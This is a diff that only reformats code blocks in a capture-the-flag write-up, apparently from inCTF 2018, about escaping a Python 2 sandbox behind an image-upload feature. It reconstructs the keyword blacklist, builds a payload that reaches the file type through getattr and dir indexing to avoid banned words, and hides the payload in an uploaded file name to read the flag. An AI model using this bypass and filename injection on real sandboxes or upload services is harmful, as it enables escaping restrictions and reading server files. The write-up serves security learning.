@@ -55,7 +55,9 @@ As we try upload some known python names, like `__class__.png`
 
 Iterating over some known and `useful` python stuff we get the following blacklist:
 
-`subprocesses|os|import|builtins|eval|locals|class|;|file`
+```python
+subprocesses|os|import|builtins|eval|locals|class|;|file
+```
 
 and the file must end with a .png.
 
@@ -64,19 +66,21 @@ and the file must end with a .png.
 From the reconnisance phase we notice the challenge is a Python sandbox escape.
 Usually the flag is hidden on the server in a .txt file, so our goal is to read a file.
 
-`().__class__.__base__.__subclasses__()[40]("flag.txt").read()`
+```python
+().__class__.__base__.__subclasses__()[40]("flag.txt").read()
+```
 
 Here is the line we want to execute, but from the reco phase we know that `__class__` and `__subclasses__` is blacklisted.
 To circumvent this we need to figure out another way to run `__class__` and `__subclasses__`  without actually typing it.
 
-```
+```python
 >>> dir([])[1]
 '__class__'
 ```
 
 Okay, we can now write the `__class__` without directly typing it to bypass the blacklist.
 
-```
+```python
 >>> getattr((), dir([])[1])
 <type 'tuple'>
 ```
@@ -84,38 +88,38 @@ This translates to `().__class__`.
 
 Okay so next we want to append `__base__`.
 
-```
+```python
 >>> getattr((), dir([])[1]).__base__
 <type 'object'>
 ```
 And now we want to append `__subclassses__`, but we know class is blacklisted so we have to bypass it somehow.
 
-```
+```python
 >>> dir(().__class__.__base__.__class__)
 ['__abstractmethods__', '__base__', '__bases__', '__basicsize__', '__call__', '__class__', '__delattr__', '__dict__', '__dictoffset__', '__doc__', '__eq__', '__flags__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__instancecheck__', '__itemsize__', '__le__', '__lt__', '__module__', '__mro__', '__name__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasscheck__', '__subclasses__', '__subclasshook__', '__weakrefoffset__', 'mro']
 ```
 We've found the `__subclasses__`. Now we just have to write the same command without using class.
 
-```
+```python
 >>> dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))
 ['__abstractmethods__', '__base__', '__bases__', '__basicsize__', '__call__', '__class__', '__delattr__', '__dict__', '__dictoffset__', '__doc__', '__eq__', '__flags__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__instancecheck__', '__itemsize__', '__le__', '__lt__', '__module__', '__mro__', '__name__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasscheck__', '__subclasses__', '__subclasshook__', '__weakrefoffset__', 'mro']
 ```
 
 Great! Let's extract what we want:
-```
+```python
 >>> dir(().__class__.__base__.__class__)[34]
 '__subclasses__'
 ```
 
 If we combine what we have so far:
-```
+```python
 getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))[34])
 <built-in method __subclasses__ of type object at 0x5610a5dd6980>
 ```
 
 Adding () to call the `__subclasses__` function.
 
-```
+```python
 >>> getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))[34])()
 [<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
 >>> getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))[34])()[40]
@@ -124,7 +128,9 @@ Adding () to call the `__subclasses__` function.
 ```
 Let's combine our payload and upload it to get the flag.
 
-```mv payload.png "print getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))[34])()[40]('flag').read()#.png"```
+```python
+mv payload.png "print getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))[34])()[40]('flag').read()#.png"
+```
 
 
 ![alt text](https://raw.githubusercontent.com/flawwan/CTF-Writeups/master/inCTF2018/images/8.png)
